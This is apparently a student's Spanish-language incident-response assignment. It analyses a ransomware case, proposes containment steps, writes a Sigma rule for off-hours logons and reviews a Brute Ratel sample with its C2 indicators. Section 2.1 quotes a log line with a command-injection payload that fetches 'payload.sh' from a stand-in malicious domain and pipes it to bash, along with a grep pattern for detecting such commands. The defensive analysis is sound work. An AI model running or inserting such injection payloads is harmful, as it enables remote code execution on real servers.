# Introducción a la respuesta a incidentes

## 1. Tarea 1

### 1.1 Errores cometidos en las primeras horas

**Falta de procedimientos y desorganización**: El error principal es no tener un plan de respuesta por escrito. Esto generó una respuesta nula o inefectiva, ya que no se definieron roles ni pasos a seguir según el tipo de incidente.

**Mala gestión técnica y pérdida de evidencia forense**: Se reiniciaron servidores y se apagaron equipos sin investigar la incidencia real ni extraer logs previamente. Reiniciar no va a descifrar los archivos y solo provoca la pérdida de datos volátiles fundamentales para el análisis forense ; lo ideal habría sido aplicar una cuarentena sin apagar las máquinas.

**Inexistencia de personal especializado**: No contar con personal dedicado en el CERT interno y retrasar el contacto con el proveedor de ciberseguridad fue crítico. Ellos son los que deben encargarse de contener e investigar para mitigar el impacto real.

**Gestión negligente de los backups**: Se intentó restaurar el backup sin revisar su estado, olvidando que las copias son el primer objetivo de los atacantes para evitar que la empresa mitigue el impacto. Además, restaurar directamente sin haber analizado antes los equipos afectados borra pruebas clave.

**Contacto directo con los atacantes sin autorización**: Un administrador contactó con el grupo criminal sin planificarlo con la directiva o el equipo legal. Esto no garantiza resolver el incidente ni recuperarse tras pagar, y expone a la empresa innecesariamente.

### 1.2. Clasificación del incidente

**Taxonomía**: Código Dañino (Malware) - Ransomware. Se identifica así porque el incidente consiste en el cifrado de archivos de red compartidos por un software malicioso llamado "DarkUCM". Además, existe una extorsión clara al exigir un pago de 2,5 BTC para recuperar el acceso.

**Peligrosidad**: Alta. Aunque aún no conocemos el alcance total, ya afecta a servicios críticos como los archivos compartidos de la red. El hecho de que el ransomware se haya reactivado y propagado a nuevas unidades tras reiniciar el servidor indica que la amenaza está activa y en expansión.

**Impacto**: Alto. Al ser una empresa financiera, la indisponibilidad de archivos compartidos bloquea la operativa de los empleados. El impacto es significativo por la naturaleza del sector (financiero) y porque ya se están viendo afectados procesos de negocio el lunes por la mañana, comprometiendo datos que pueden ser críticos.

### 1.3. Sesión de evaluación preliminar

Como Incident Handler, realizaría las siguientes 5 preguntas clave para tomar el control de la situación:

_¿Disponéis de un inventario actualizado de activos y cuáles de ellos están identificados como críticos para el negocio?_ Necesito saber qué máquinas son el "corazón" de la empresa (servidores de base de datos, controladores de dominio, etc.) para priorizar su protección y evaluar el alcance real del impacto en la operativa.¿
_Cuál es el esquema actual de segmentación de la red y qué dispositivos de seguridad (Firewalls, WAF, VPN) están activos?_
Esto ayuda a entender si existe aislamiento entre departamentos o si la red es plana. Es fundamental para diseñar medidas de contención inmediata y evitar que el ransomware siga saltando de una subred a otra.
_¿Qué herramientas de monitorización y respuesta tenéis (EDR, SIEM, Antivirus) y dónde se centralizan sus logs?_
Para el análisis forense y la detección activa, necesito saber si hay trazas de la ejecución del malware o de conexiones sospechosas. Saber dónde están los logs permite asegurar que no se sobrescriban o sean borrados por el atacante.
_¿Cuál es el estado y la ubicación de las copias de seguridad, y están aisladas de la red principal (offline/inmutables)?_
Antes de intentar cualquier recuperación, debemos asegurar que el backup no está cifrado ni comprometido. Si las copias están conectadas a la red infectada, podrían ser el próximo objetivo o ya estar inservibles.
_¿Qué acciones técnicas exactas se han ejecutado desde la detección del primer aviso hasta ahora?_
Necesito saber si se han reiniciado equipos o restaurado datos para valorar qué evidencia volátil (en RAM o logs) se ha podido perder ya. Esto evita que sigamos cometiendo errores que dificulten el análisis de la causa raíz.

### 1.4. Medidas iniciales de contención

Como no podemos cortar Internet totalmente, mi prioridad sería frenar el movimiento lateral y asegurar la supervivencia de las evidencias. Estas son las 5 medidas:

**Segmentación de emergencia y control de tráfico**: Al ser una red plana, el atacante se mueve sin restricciones. Implementaría reglas de firewall para bloquear puertos críticos (RDP, SMB) y crearía zonas de seguridad para aislar los servidores sanos de la red infectada.

**Extracción prioritaria de logs y evidencias volátiles**: Antes de que se sobrescriban o el atacante los borre, realizaría la recolección de logs de los Firewalls, Proxies y de los sistemas afectados. Me centraría especialmente en volcar la información de los equipos que siguen encendidos para no perder conexiones de red activas y procesos en memoria (evidencia volátil).

**Gestión de identidades y reseteo de cuentas**: Con los controladores de dominio comprometidos, es obligatorio resetear las contraseñas de todos los administradores y forzar el cierre de sesiones activas. No sirve de nada contener si el atacante sigue teniendo credenciales válidas.

**Filtrado estricto de la conexión a Internet**: Configuraría el firewall perimetral para bloquear todo el tráfico de salida hacia IPs desconocidas, permitiendo solo lo esencial para el negocio. Esto dificulta que el ransomware se comunique con su servidor de control (C2) para recibir órdenes o exfiltrar más datos.

**Auditoría de Backups y Plan de Comunicación**: Paralizaría cualquier restauración hasta confirmar que las copias son íntegras y no están infectadas. Al mismo tiempo, activaría el protocolo de comunicación con el personal, el equipo legal y las autoridades (INCIBE/AEPD) para cumplir con la normativa y gestionar la crisis.

**Plan de comunicación y notificación legal**: Alertaría a todo el personal con instrucciones claras para evitar que el incidente crezca. Además, coordinaría con el equipo legal y de comunicación la notificación a instituciones gubernamentales (como el INCIBE o la AEPD) para cumplir con la normativa vigente y gestionar la reputación de la empresa.

## 2. Tarea 2

### 2.1 Identificación de la actividad maliciosa

Para localizar el vector de ataque en el servidor web, se ha procedido a filtrar el archivo access.log buscando patrones de ejecución de comandos, descarga de artefactos externos y caracteres de encadenamiento (|, ;, &). Se ha empleado el siguiente comando: `grep -E "wget|curl|chmod|bash|sh|;|%20" access.log`

![Ruta maliciosa](<2.1-ruta maliciosa.png>)

De esta forma se ha identificado la línea de log:

```bash
192.168.5.23 - - [12/Jun/2025:03:41:17 +0200] "GET /cgi-bin/status.sh?user=;wget http://malicious
domain.com/payload.sh -O- | bash HTTP/1.1" 200 452 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```

El log revela una explotación exitosa de una vulnerabilidad de Inyección de Comandos a través del parámetro user en el script status.sh. El atacante utiliza el punto y coma (;) para finalizar la instrucción legítima e inyectar un nuevo comando que descarga un script malicioso (payload.sh) mediante wget. Posteriormente, utiliza un "pipe" (|) para redirigir el contenido directamente a bash, logrando la ejecución del código en memoria sin necesidad de guardar el archivo en disco (evadiendo así análisis de archivos estáticos). El código de respuesta 200 OK confirma que la petición fue procesada por el servidor, estableciendo este evento como el vector de entrada inicial.

## 2.2 Regla Sigma para detección de accesos fuera de horario

Para detectar intentos de acceso lateral o persistencia mediante RDP y conexiones de red en los controladores de dominio, se ha desarrollado la siguiente regla Sigma:

```bash
title: Inicio de sesión de red o RDP fuera de horario de operación
id: 123
status: experimental
description: |
    Detecta inicios de sesión de tipo red (3) o RDP (10) en controladores de dominio
    realizados fuera del horario de operación estándar (08:00 a 19:00).
author: Henri Daniel Peña Dequero
date: 2026/04/13
logsource:
    product: windows
    service: security
detection:
    selection_logon:
        EventID: 4624
        LogonType:
            - 3
            - 10
    business_hours:
        @timestamp|hour:
            - 8
            - 9
            - 10
            - 11
            - 12
            - 13
            - 14
            - 15
            - 16
            - 17
            - 18
    condition: selection_logon and not business_hours
falsepositives:
    - Labores de mantenimiento nocturnas autorizadas.
level: high
```

Esta regla monitoriza el evento 4624 (inicio de sesión exitoso) filtrando por los tipos 3 (Red) y 10 (RDP), críticos para detectar movimientos laterales. Se define el horario laboral (08:00 a 19:00) para excluirlo de la alerta mediante la condición not business_hours, centrando la detección en actividad sospechosa fuera de la jornada habitual. El nivel se establece en high debido a la criticidad de los activos (Controladores de Dominio) y la alta probabilidad de compromiso si se accede fuera de horas.

## 2.3 Análisis de la muestra maliciosa

Se ha realizado la búsqueda en VirusTotal

![Búsqueda en VirusTotal](2.3-busqueda-virus-total.png)

**Pregunta 1**: Tras el análisis del hash `617e31e9f71b365fe69719d3fc980d763e827a4f93d0e776d1587d0bfdb47674` en VirusTotal y la consulta de los reportes de sandboxes como Zenbox y Yomi Hunter, se identifican conexiones directas hacia las direcciones IP de Comando y Control (C2) `185.106.92.54` y `82.115.223.40`, ambas operando sobre el puerto 8041. Asimismo, se detecta tráfico hacia la IP `64.233.181.94` (puerto 443) y resoluciones DNS para los dominios maliciosos bazarunet.com, tiguanin.com y greshunka.com.

**Pregunta 2**: Se determina que el archivo analizado forma parte de una campaña que utiliza un agente conocido como "Badger", perteneciente al framework de simulación de adversarios Brute Ratel C4 (BRc4). El artefacto intenta suplantar la identidad de una librería legítima de NVIDIA denominada `PhysXCooking64.dll` para evadir la detección de soluciones de seguridad.

**Pregunta 3**: Consultando fuentes de inteligencia de amenazas, la utilización de este malware (Brute Ratel) se asocia inicialmente a un actor de amenazas de alta sofisticación identificado como APT29 (también conocido como Cozy Bear o Nobelium). Este grupo es reconocido por su vinculación con operaciones de ciberespionaje estatal y el uso de herramientas comerciales para dificultar la atribución.

**Pregunta 4**: El vector de entrada más habitual asociado a este malware es el Spear Phishing dirigido. Se basa habitualmente en el envío de archivos adjuntos (ISO, LNK o ZIP) que ejecutan una cadena de infección mediante DLL Side-Loading, utilizando procesos legítimos del sistema como rundll32.exe para cargar la librería maliciosa. Se debe comunicar al equipo forense la necesidad de auditar la ejecución de procesos en directorios temporales (AppData\Local\Temp) y rastrear el origen del compromiso en el buzón de correo del empleado del departamento de compras.
